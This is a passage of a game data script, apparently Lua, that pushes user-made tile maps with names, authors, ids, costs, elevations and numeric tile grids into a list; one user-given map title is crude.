6,90,116,1,0,1,116,90,90,90,90,116,1,36,36,1,116,90,116,90,116,90,116,1,0,1,116,116,116,116,116,116,1,36,36,1,116,90,116,90,116,90,116,1,0,1,116,90,90,90,90,116,1,36,36,1,116,90,116,90,116,90,116,1,0,1,116,116,116,116,116,116,116,36,36,1,116,90,116,90,116,90,116,1,0,1,116,116,116,116,116,116,116,36,36,1,116,116,116,116,116,116,116,1,0,1,1,1,1,1,1,1,1,0,0,1,1,1,1,1,1,116,116,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Prop Room 3",author="TF2 Pencil",id="#1666470791",direction="left",cost=184,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,114,114,1,0,0,0,0,0,0,0,0,1,90,114,90,114,90,114,114,114,114,114,1,0,0,0,0,0,0,0,0,1,114,90,114,90,114,90,114,114,114,114,1,0,0,0,0,0,0,0,0,1,90,114,90,114,114,114,114,1,90,90,1,0,0,0,0,0,0,0,0,1,114,114,114,114,114,90,114,1,114,114,1,0,0,0,0,0,0,0,0,1,114,114,90,114,114,114,114,1,90,90,1,0,0,0,0,0,0,0,0,1,114,114,114,90,114,90,114,1,114,114,1,0,0,0,0,0,0,0,0,1,114,114,90,114,90,114,114,1,0,0,1,0,0,0,0,0,0,0,0,1,114,114,1,1,1,1,1,1,0,0,1,0,0,0,0,2,14,14,14,114,114,114,91,114,90,90,90,90,114,114,1,0,0,0,0,2,14,14,14,114,114,114,91,114,90,90,90,90,114,114,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Prop Room 4",author="TF2 Pencil",id="#1666470822",direction="left",cost=249,elevation=0,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,119,119,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,119,119,119,119,119,1,119,119,119,119,119,119,19,19,0,0,0,0,0,1,90,90,90,90,119,1,119,90,90,90,90,90,19,19,0,0,0,0,0,1,119,119,119,119,119,1,119,119,119,119,119,1,19,19,0,0,0,0,0,1,119,90,90,90,90,90,90,90,90,90,119,1,19,19,0,0,0,0,0,1,119,119,119,119,119,119,119,119,119,119,119,1,19,19,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,19,19,0,0,0,0,0,1,119,119,119,119,119,0,90,119,90,119,90,1,19,19,0,0,0,0,0,1,119,90,90,90,119,0,119,119,119,119,119,1,19,19,0,0,0,0,0,1,119,90,90,90,119,1,90,119,90,119,90,1,19,19,0,0,2,19,19,119,119,90,90,90,119,1,119,119,119,119,119,1,19,19,0,0,2,19,19,119,119,119,119,119,119,1,90,119,90,119,90,1,19,19,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,119,119,1,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Outer plateau",author="Luffaren",id="#1666480987",direction="right",cost=334,elevation=-5,map=[14,14,2,2,14,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,14,14,14,14,14,1,0,0,1,1,1,1,1,1,0,0,0,0,0,0,14,14,14,14,14,1,0,0,1,90,9,9,90,1,0,0,0,0,0,0,14,14,14,14,14,114,34,34,114,9,65,65,9,1,0,0,0,0,0,0,14,14,14,14,14,1,0,0,1,9,65,65,9,1,0,0,0,0,0,0,14,14,14,14,14,1,0,0,1,9,65,65,9,1,0,0,0,0,0,0,89,13,13,13,89,1,34,0,1,9,65,65,9,1,1,1,1,1,1,1,14,12,12,12,14,1,0,0,1,9,65,65,9,109,109,109,109,109,93,1,14,11,11,11,14,1,0,0,1,90,9,9,90,109,109,109,109,109,93,1,14,10,10,10,14,1,94,93,1,1,1,1,1,1,1,1,109,109,1,1,14,9,9,9,14,1,1,1,1,1,1,1,1,1,1,1,109,109,1,1,9,9,9,9,9,9,90,9,9,90,9,9,90,9,9,90,9,9,90,9,9,9,9,9,9,89,9,9,9,9,9,9,9,9,9,9,9,9,9,2,9,9,9,9,9,9,9,9,9,9,9,89,9,9,9,9,9,9,9,2,9,94,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,94,9,9,9,65,65,65,65,9,9,9,9,65,65,65,65,9,9,9,9,9,9,9,9,67,67,67,67,9,9,9,9,67,67,67,67,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Twink Anus",author="mangaka7",id="#1666481945",direction="forward",cost=350,elevation=2,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,Vector(44,63,35),Vector(44,63,35),0,0,0,0,0,0,0,0,0,125,125,0,0,0,0,0,0,0,Vector(44,63,35),Vector(80,106,32),Vector(44,63,35),0,0,0,50,Vector(44,63,35),Vector(44,63,35),0,0,0,0,0,0,0,0,0,0,0,Vector(44,63,35),Vector(44,63,35),Vector(80,106,32),0,50,50,50,Vector(80,106,32),Vector(44,63,35),0,50,50,50,50,0,0,50,50,50,50,50,Vector(44,63,35),Vector(44,63,35),50,56,56,56,Vector(44,63,35),Vector(80,106,32),50,56,56,56,50,50,50,56,56,50,56,56,3,56,56,56,56,56,Vector(44,63,35),56,56,1,40,56,56,56,56,56,91,1,56,56,56,56,56,56,50,50,Vector(44,63,35),56,56,1,1,50,56,56,50,91,56,56,1,56,56,56,56,50,50,56,Vector(44,63,35),56,56,1,40,50,56,50,91,50,56,56,1,50,56,56,56,56,56,56,Vector(80,106,32),56,56,56,1,56,56,91,56,56,91,56,56,1,56,50,56,56,56,56,Vector(44,63,35),56,56,56,56,56,56,56,56,56,91,56,56,1,56,50,56,50,50,50,56,56,56,56,56,56,56,56,56,56,91,56,56,1,56,50,56,56,56,56,56,Vector(44,63,35),56,56,1,56,56,91,56,56,91,56,56,1,56,50,56,56,56,56,Vector(44,63,35),Vector(44,63,35),56,1,40,50,56,93,91,50,56,56,1,50,56,56,Vector(44,63,35),56,56,50,Vector(80,106,32),Vector(80,106,32),56,1,1,50,56,50,91,56,56,56,1,56,56,Vector(44,63,35),Vector(80,106,32),Vector(44,63,35),56,56,Vector(80,106,32),Vector(80,106,32),56,1,40,56,56,56,50,91,50,1,56,56,50,Vector(44,63,35),Vector(44,63,35),50,50,56,Vector(44,63,35),Vector(80,106,32),56,56,56,56,56,56,56,56,91,91,50,56,Vector(44,63,35),Vector(80,106,32),Vector(44,63,35),56,56,56,Vector(44,63,35),Vector(44,63,35),50,50,50,50,50,50,Vector(80,106,32),Vector(80,106,32),Vector(80,106,32),56,56,56,Vector(80,106,32),Vector(80,106,32),3,56,56,56,Vector(44,63,35),Vector(44,63,35),0,0,0,0,Vector(44,63,35),Vector(80,106,32),Vector(80,106,32),Vector(80,106,32),Vector(44,63,35),50,50,50,Vector(80,106,32),Vector(80,106,32),56,56,56,50,Vector(44,63,35),0,0,0,0,0,Vector(44,63,35),Vector(80,106,32),Vector(44,63,35),Vector(44,63,35),Vector(44,63,35),0,0,0,Vector(80,106,32),Vector(80,106,32),56,56,50,50,0,0,0,0,0,Vector(44,63,35),Vector(44,63,35),Vector(44,63,35),Vector(44,63,35),Vector(44,63,35),0,0,0,0,0,0,2,2,0,0]});
maps.push({name="Waterslidev2",author="MoistNoodlez",id="#1666555588",direction="right",cost=600,elevation=0,map=[1,24,2,2,24,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,1,24,24,24,24,1,1,14,14,14,14,5,5,5,5,5,5,1,0,0,1,24,24,24,24,1,1,140,140,140,140,140,140,140,140,140,140,1,0,0,1,24,94,94,24,1,1,140,140,140,140,140,140,140,140,140,140,1,0,0,1,127,24,24,127,1,1,140,140,140,140,140,140,140,140,140,140,1,0,0,1,24,127,127,24,1,1,14,66,66,14,1,1,5,135,135,5,1,0,0,1,140,140,140,140,1,1,14,66,66,14,1,1,5,135,135,5,1,0,0,1,140,140,140,140,1,1,14,66,66,14,1,1,5,135,135,5,1,0,0,1,140,140,140,140,1,1,14,66,66,14,1,1,5,135,135,5,1,0,0,1,140,140,140,140,1,1,14,66,66,14,1,1,5,135,135,5,1,0,0,1,140,140,140,140,1,1,14,66,66,14,1,1,5,135,135,5,1,0,0,1,140,140,140,140,1,1,14,66,66,14,1,1,5,135,135,5,1,0,0,1,140,140,140,140,1,1,14,66,66,14,1,1,5,135,135,5,1,0,0,1,140,140,140,140,1,1,14,126,126,14,1,1,5,135,135,5,1,0,0,1,66,66,66,66,1,1,14,126,126,14,1,1,5,135,135,5,1,0,0,1,66,66,66,66,66,66,66,66,66,66,1,1,5,5,5,5,1,0,0,1,66,66,66,66,66,66,66,66,66,66,1,1,92,92,92,92,1,1,1,1,66,66,66,66,66,66,66,66,66,66,1,1,24,24,24,24,24,24,2,1,66,66,66,66,66,66,66,66,66,66,1,1,24,24,24,24,24,24,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="5 Holds",author="TF2 Pencil",id="#1666586155",direction="forward",cost=231,elevation=0,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,97,9,0,9,9,9,9,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,9,9,132,9,0,0,0,0,0,0,0,0,96,96,96,96,0,0,0,0,9,9,9,9,0,9,102,0,0,0,0,0,96,96,96,96,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,101,101,101,101,0,0,0,0,0,99,9,0,9,9,9,9,0,0,0,0,101,101,101,101,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,9,9,9,9,0,9,104,0,0,0,0,0,98,98,98,98,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,98,98,98,98,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,103,103,103,103,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,103,103,103,103,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,9,131,9,9,0,0,0,0,95,95,95,95,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,95,95,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0]});
maps.push({name="Crowded Rooms 8",author="TF2 Pencil",id="#1666586186",direction="forward",cost=183,elevation=6,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,97,9,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,1,1,109,1,1,1,1,1,1,109,109,1,0,0,0,0,0,0,0,0,1,49,49,49,49,15,49,49,49,49,49,1,97,0,0,0,0,0,0,0,1,49,49,49,49,15,49,49,49,49,49,109,9,0,0,0,0,0,0,0,1,49,49,49,49,109,49,49,49,49,49,1,0,0,0,0,0,0,0,0,1,49,49,49,49,109,49,49,49,49,49,1,0,0,0,0,0,0,0,0,1,49,49,49,49,1,1,1,1,15,15,1,0,0,0,0,0,0,0,0,1,15,15,109,109,1,1,49,49,49,49,109,96,9,9,0,0,0,0,0,1,49,49,49,49,49,109,49,49,49,49,1,0,0,10,0,0,0,0,0,1,49,49,49,49,49,109,49,49,49,49,1,0,0,11,0,0,0,0,9,109,49,49,49,49,49,1,49,49,49,49,1,0,0,12,0,0,0,0,97,1,49,49,49,49,49,1,49,49,49,49,15,15,14,13,0,0,0,0,0,1,15,15,1,1,1,1,1,1,109,1,1,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,9,97,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Can we go in",author="TF2 Pencil",id="#1666586289",direction="left",cost=442,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,2,14,14,14,0,14,144,144,144,144,144,144,144,144,14,0,14,14,0,0,2,14,14,14,0,14,144,144,144,144,144,144,144,144,14,0,14,14,0,0,0,0,14,14,0,14,144,144,144,144,144,144,144,144,14,0,14,14,0,0,0,0,14,14,0,14,144,144,144,144,144,144,144,144,14,0,14,14,0,0,0,0,14,14,0,14,144,144,144,144,144,144,144,144,14,0,14,14,0,0,0,0,14,14,0,14,144,144,144,144,144,144,144,144,14,0,14,14,0,0,0,0,14,14,0,14,144,144,144,144,144,144,144,144,14,0,14,14,0,0,0,0,14,14,0,14,144,144,144,144,144,144,144,144,14,0,14,14,0,0,0,0,14,14,0,14,144,144,144,144,144,144,144,144,14,0,14,14,0,0,0,0,14,14,0,14,144,144,144,144,144,144,144,144,14,0,14,14,0,0,0,0,14,14,0,14,14,14,14,14,14,14,14,14,14,0,14,14,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Get Down Carefully",author="TF2 Pencil",id="#1666594587",direction="forward",cost=101,elevation=-16,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,20,0,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,20,0,20,0,0,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,20,0,20,0,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,20,0,20,0,0,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,0,16,0,0,16,0,16,16,16,16,0,12,0,12,0,0,20,20,20,20,0,0,16,16,0,0,16,16,16,16,0,12,0,12,0,0,20,20,20,20,0,0,16,16,0,0,16,16,16,16,0,12,0,12,0,0,20,20,20,20,0,16,0,0,16,0,16,16,16,16,0,12,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Pool Day",author="TF2 Pencil",id="#1666594834",direction="forward",cost=344,elevation=6,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,110,110,1,1,1,1,1,1,1,0,0,0,0,1,50,50,50,50,50,50,50,50,50,50,50,50,50,50,1,0,0,0,0,1,50,10,10,10,10,10,10,10,10,10,10,10,10,50,1,0,0,0,0,1,50,10,10,66,66,66,66,66,66,66,66,10,10,50,1,0,0,0,0,1,50,10,10,66,66,66,66,66,66,66,66,10,10,50,1,0,0,0,0,1,50,10,10,66,66,66,66,66,66,66,66,10,10,50,1,0,0,0,0,1,50,16,10,66,66,66,66,66,66,66,66,10,16,50,1,0,0,0,0,1,50,15,10,66,66,66,66,66,66,66,66,10,15,50,1,0,0,0,0,1,50,14,10,66,66,66,66,66,66,66,66,10,14,50,1,0,0,0,0,1,50,13,10,66,66,66,66,66,66,66,66,10,13,50,1,0,0,0,0,1,50,12,10,66,66,66,66,66,66,66,66,10,12,50,1,0,0,0,0,1,50,11,10,66,66,66,66,66,66,66,66,10,11,50,1,0,0,0,0,1,50,10,10,66,66,66,66,66,66,66,66,10,10,50,1,0,0,0,0,1,50,10,10,10,10,10,10,10,10,10,10,10,10,50,1,0,0,0,0,1,50,50,50,50,50,50,50,50,50,50,50,50,50,50,1,0,0,0,0,1,1,1,1,1,1,1,116,116,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="52n9viuesrg0923hnvqf",author="TF2 Pencil",id="#1666596188",direction="forward",cost=166,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,127,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,0,0,0,0,0,0,1,1,1,1,1,1,0,0,1,20,20,20,20,1,0,0,0,0,0,0,1,20,20,20,20,1,0,0,1,20,20,20,20,1,0,0,0,0,0,0,1,20,20,20,20,1,0,0,1,20,20,1,20,1,1,0,0,0,0,1,1,20,1,20,20,1,0,0,1,20,20,1,20,20,20,20,20,20,20,20,20,20,1,20,20,1,0,0,1,20,20,1,20,20,20,20,20,20,20,20,20,20,1,20,20,1,0,0,1,20,20,1,1,1,1,1,1,1,1,1,1,1,1,20,20,1,0,0,1,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,1,0,0,1,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,1,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Baby lon",author="ZpLit",id="#1666641046",direction="right",cost=431,elevation=0,map=[5,5,5,6,6,7,7,8,8,9,9,10,10,11,5,2,2,5,4,8,5,5,5,6,6,7,7,8,8,9,9,10,10,10,5,5,5,5,5,4,5,5,5,6,6,7,7,8,8,9,9,10,10,10,5,5,5,5,5,11,5,5,90,19,18,18,18,18,18,18,19,10,10,10,5,5,5,5,5,5,5,5,5,18,18,18,18,18,90,18,18,10,10,10,5,5,5,5,93,5,5,5,5,18,90,64,64,64,95,18,18,11,11,11,5,5,5,12,94,1,5,90,5,18,18,64,1,1,64,18,90,11,11,11,5,5,5,22,22,22,5,5,5,18,18,63,1,124,64,18,18,12,12,12,5,4,5,23,23,23,5,5,5,90,18,63,1,124,1,18,18,12,12,12,9,9,23,23,5,5,5,5,5,18,18,62,1,124,1,0,0,13,13,13,5,5,24,24,65,2,5,5,90,18,18,62,1,124,44,129,0,13,13,13,5,5,24,24,65,2,5,5,5,18,18,61,1,1,1,93,18,14,14,14,91,91,23,23,5,5,5,1,5,18,18,61,60,59,58,18,18,14,14,14,5,5,5,23,23,23,13,1,45,18,18,17,16,15,95,15,15,15,15,15,5,5,5,22,22,22,94,1,45,18,18,17,16,15,95,15,15,15,15,16,5,5,5,5,76,1,13,1,45,45,11,5,5,5,5,5,85,91,5,5,5,5,5,5,68,17,5,1,5,5,3,5,5,5,5,5,85,91,5,5,5,5,5,5,68,18,5,5,5,5,5,5,5,5,1,1,13,15,13,15,12,5,5,68,68,19,20,47,5,45,5,5,45,5,5,10,94,8,6,5,76,79,68,68,17,0,0,19,20,19,17,18,18,19,17,18,19,18,19,18,18,19,18,17,0,0]});
maps.push({name="Waterfall Bridge",author="sivi",id="#1666645256",direction="right",cost=304,elevation=9,map=[0,0,0,0,0,0,1,1,5,2,2,5,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,90,5,5,5,5,90,1,1,0,0,0,0,0,0,0,0,1,1,1,5,5,5,5,5,5,5,5,1,1,1,0,0,0,0,0,0,1,124,65,67,5,5,5,5,5,5,67,65,124,1,0,0,0,0,0,0,1,124,65,67,5,5,5,5,5,5,67,65,124,1,0,0,0,0,0,0,1,124,65,67,5,5,5,5,5,5,67,65,124,1,0,0,0,0,0,0,1,1,1,5,5,5,127,127,5,5,5,1,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,1,1,1,1,0,0,67,0,0,0,0,67,0,0,1,88,114,90,1,1,1,114,114,114,34,35,15,35,35,35,35,15,35,34,114,114,114,114,2,1,90,114,114,114,34,35,15,35,35,35,35,15,35,34,114,114,114,114,2,1,114,114,114,1,0,0,67,0,0,0,0,67,0,0,1,88,114,90,1,1,114,114,114,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,7,7,7,1,105,1,90,5,5,5,5,5,1,105,1,0,0,0,0,1,7,125,7,1,94,1,5,5,5,5,5,90,1,93,1,0,0,0,0,1,7,7,7,1,1,1,5,5,5,5,5,5,1,1,1,0,0,0,0,1,90,7,7,6,6,5,5,5,67,67,5,1,1,0,0,0,0,0,0,1,1,7,7,6,6,90,5,1,65,65,1,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,124,124,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0]});
maps.push({name="Doing Laps",author="ZpLit",id="#1666766412",direction="forward",cost=514,elevation=-7,map=[1,14,14,14,14,14,14,14,14,2,2,14,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,1,66,66,66,66,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,66,66,66,66,1,0,1,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,1,0,1,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,1,0,1,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,1,0,1,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,1,0,1,66,66,66,66,1,1,1,66,66,66,66,1,1,66,66,66,66,1,0,1,66,66,66,66,1,0,1,66,66,66,66,1,1,66,66,66,66,1,0,1,66,66,66,66,1,0,1,66,66,66,66,1,1,66,66,66,66,1,1,1,66,66,66,66,1,0,1,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,1,0,1,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,1,0,1,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,1,0,1,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,1,0,1,66,66,66,66,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,66,66,66,66,1,0,0,0,0,0,0,0,0,7,7,7,7,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,7,7,7,7,14,100,14,14,14,14,14,1,0,0,0,0,0,0,0,0,88,2,2,88,14,14,14,14,14,14,14,1]});
maps.push({name="Backfire",author="ZpLit",id="#1666768750",direction="forward",cost=230,elevation=-4,map=[0,0,0,0,0,0,0,24,14,2,2,14,24,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,14,14,14,14,24,24,24,0,0,0,0,0,0,0,0,0,24,94,48,108,48,48,48,48,108,48,94,24,0,0,0,0,0,0,0,0,24,48,48,108,48,48,48,48,108,48,48,24,0,0,0,0,0,0,0,0,24,48,48,24,48,48,48,48,24,48,48,24,0,0,0,0,0,0,0,0,24,49,49,24,49,49,49,49,24,49,49,24,0,0,0,0,0,0,0,0,24,50,50,24,50,50,50,50,24,50,50,24,0,0,0,0,0,0,0,0,24,51,51,24,30,30,30,30,24,51,51,24,0,0,0,0,0,0,0,0,24,52,52,24,30,30,89,30,24,52,52,24,0,0,0,0,0,0,0,0,24,53,53,24,89,30,30,30,24,53,53,24,0,0,0,0,0,0,0,0,24,54,54,24,30,30,30,89,24,54,54,24,0,0,0,0,0,0,0,0,24,54,54,24,30,89,30,30,24,54,54,24,0,0,0,0,0,0,0,0,24,54,54,24,30,30,30,89,24,54,54,24,0,0,0,0,0,0,0,0,24,54,54,24,89,30,30,30,24,54,54,24,0,0,0,0,0,0,0,0,24,55,55,24,30,30,89,30,24,55,55,24,0,0,0,0,0,0,0,0,24,56,56,24,30,89,30,30,24,56,56,24,0,0,0,0,0,0,0,0,24,57,57,24,30,30,30,30,24,57,57,24,0,0,0,0,0,0,0,0,24,58,58,58,30,30,30,30,58,58,58,24,0,0,0,0,0,0,0,0,24,58,58,58,30,30,30,30,58,58,58,24,0,0,0,0,0,0,0,0,0,24,24,24,88,2,2,88,24,24,24,0,0,0,0,0]});
maps.push({name="Cardio Day",author="ZpLit",id="#1666833241",direction="forward",cost=550,elevation=0,map=[1,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,66,66,66,1,0,0,1,82,82,82,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,82,82,82,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,82,5,82,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,82,82,82,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,82,82,82,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,82,82,5,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,82,82,82,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,82,82,82,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,82,5,82,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,82,82,82,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,82,82,82,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,82,82,5,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,82,82,82,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,82,82,82,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,82,5,82,82,1,0,0,1,66,66,66,1,1,66,66,66,1,0,0,1,76,76,76,76,1,0,0,1,66,66,66,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,5,5,5,5,5,5,5,88,2,2,88,5,5,5,5,5,5,5,1]});
